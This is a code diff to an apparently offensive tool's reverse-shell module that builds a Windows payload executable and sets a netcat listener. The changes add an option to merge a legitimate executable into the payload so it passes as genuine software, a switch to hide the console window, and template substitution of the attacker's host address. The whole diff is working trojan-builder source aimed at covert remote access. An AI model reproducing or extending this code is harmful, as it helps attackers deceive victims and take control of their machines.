@@ -24,6 +24,8 @@ export default class ReverseShellModule extends Module {
     hostIp = '10.0.2.2';
     finalExeName = 'payload.exe';
     finalExeDescription = 'sussy backa';
+    runSilent: 'true'|'false' = 'true';
+    mergeFilePath = '';
     hostCmd = `nc -n 127.0.0.1 -l ${this.listenPort}`;
     
     public args = [
@@ -40,12 +42,22 @@ export default class ReverseShellModule extends Module {
         {
             arg: 'exe_name=',
             desc: "Name of the exe file generated. Default is payload.exe",
-            handler: name => this.finalExeName = name
+            handler: name => name.endsWith('.exe') ? (this.finalExeName = name) : (this.finalExeName = name + '.exe')
         },
         {
             arg: 'exe_desc=',
             desc: "Description of the exe file generated. Default is 'sussy backa'",
             handler: desc => this.finalExeDescription = desc
+        },
+        {
+            arg: 'exe_spoof=',
+            desc: 'Path to an EXE file to run in correlation to the payload.',
+            handler: this.handleSetMergePath
+        },
+        {
+            arg: 'run_silent=',
+            desc: "Should the exe hide the console window. Default is true.",
+            handler: silent => ['true', 'false'].includes(silent.toLowerCase()) && (this.runSilent = silent) 
         },
         {
             arg: 'ico_path=',
@@ -63,6 +75,23 @@ export default class ReverseShellModule extends Module {
             handler: this.handleListen
         }
     ]
+
+    handleSetMergePath(path: string) {
+        if(!fs.existsSync(path)){
+            cmdWarn(`Error, path to spoof exe not found: ${path}`);
+            return;
+        }
+        if(!path.endsWith('.exe')){
+            cmdWarn(`Error, exe_spoof has to be a path to an exe file. ${path}`);
+            return;
+        }
+
+        this.mergeFilePath = path;
+
+        // copy the file as an asset
+        fs.copyFileSync(path, __dirname + '/win-proj/winResource.exe');
+    }
+
     async handleGenerate() {
         // generate the dummy index.js file based on params
         const placeholder = this.getPlaceholder();
@@ -95,11 +124,13 @@ export default class ReverseShellModule extends Module {
         this.executePkg(dummyJs, this.finalExeName);
         
         // make the exe hidden
-        console.log('[log] - Making the exe hidden...');
-        require('create-nodew-exe')({
-            src: path.join(__dirname, `../../${this.finalExeName}`),
-            dst: path.join(__dirname, `../../${this.finalExeName}`),
-        });
+        if(this.runSilent.toLowerCase() == "true"){
+            console.log('[log] - Making the exe hidden...');
+            require('create-nodew-exe')({
+                src: path.join(__dirname, `../../${this.finalExeName}`),
+                dst: path.join(__dirname, `../../${this.finalExeName}`),
+            });
+        }
 
         // remove the leftovers
         console.log('[log] - Removing leftover files...');
@@ -144,8 +175,10 @@ export default class ReverseShellModule extends Module {
     }
 
     getPlaceholder(): string {
-        let str:string = fs.readFileSync(__dirname + '/template.txt').toString();
-        return str.replace('{{HOST}}', this.hostIp);
+        let str:string = fs.readFileSync(__dirname + '/template.js').toString();
+        str = str.replace('{{HOST}}', this.hostIp);
+        str = str.replace('{{HAS_MERGE}}', this.mergeFilePath.length > 0 ? "true" : "false");
+        return str;
     }
 
     executePkg(jsPath, exeName){
@@ -164,7 +197,7 @@ export default class ReverseShellModule extends Module {
     }
 
     async changeVersionInfo(winBin) {
-        let templateData = fs.readFileSync(__dirname + '/rctemplate.txt').toString();
+        let templateData = fs.readFileSync(__dirname + '/rctemplate.rc').toString();
 
         // replace meta data
         templateData = templateData.replace(new RegExp('{{FILENAME}}', 'g'), this.finalExeName);
